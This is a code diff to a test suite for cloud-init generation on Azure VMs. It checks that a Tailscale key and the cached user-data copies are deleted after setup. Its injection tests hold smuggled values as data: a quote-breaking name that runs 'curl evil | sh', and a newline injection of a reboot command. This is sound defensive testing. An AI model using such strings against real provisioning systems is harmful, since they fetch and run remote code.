@@ -11,7 +11,13 @@ import {
   throwawaySshPublicKey,
   vmBody,
 } from '../src/cloud/azure.js';
-import { CloudInitError, renderCloudInit, shQuote } from '../src/cloud/cloud-init.js';
+import {
+  CloudInitError,
+  renderCloudInit,
+  shQuote,
+  TAILSCALE_KEY_FILE,
+  USER_DATA_COPIES,
+} from '../src/cloud/cloud-init.js';
 import { splitByMonth } from '../src/cloud/service.js';
 import { loadConfig } from '../src/config.js';
 import { withStepUp } from './agent-helpers.js';
@@ -379,7 +385,28 @@ describe('cloud security (M22)', { timeout: 60_000 }, () => {
       hubOrigin: 'https://hz.example.ts.net',
       code: 'ABCD-EFGH',
     };
-    expect(renderCloudInit(ok)).toContain("--hostname='hz-mc'");
+    const doc = renderCloudInit(ok);
+    expect(doc).toContain("--hostname='hz-mc'");
+    // The key lives in a 0600 tmpfs file and every on-disk copy of the user data is
+    // removed after `tailscale up` and on exit; obj.pkl stays (reboot needs it).
+    const copies = USER_DATA_COPIES.join(' ');
+    expect(USER_DATA_COPIES).toEqual(
+      expect.arrayContaining([
+        '/var/lib/cloud/instance/user-data.txt',
+        '/var/lib/cloud/instance/user-data.txt.i',
+        '/var/lib/cloud/instance/cloud-config.txt',
+        '/var/lib/waagent/ovf-env.xml',
+        '/var/lib/waagent/CustomData',
+      ]),
+    );
+    expect(doc).toContain(`trap 'rm -f ${TAILSCALE_KEY_FILE} ${copies}' EXIT`);
+    const lines = doc.split('\n').map((l) => l.trim());
+    const up = lines.findIndex((l) => l.startsWith('tailscale up '));
+    expect(up).toBeGreaterThan(0);
+    expect(lines[up + 1]).toBe(`rm -f ${TAILSCALE_KEY_FILE}`);
+    expect(lines[up + 2]).toBe(`rm -f ${copies}`);
+    expect(doc).not.toContain('obj.pkl');
+    expect(doc.split(FAKE_TAILSCALE_KEY)).toHaveLength(2);
     const hostile: [keyof typeof ok, string][] = [
       ['name', "hz-mc'; curl evil | sh; '"],
       ['name', 'hz-mc\nruncmd: [reboot]'],
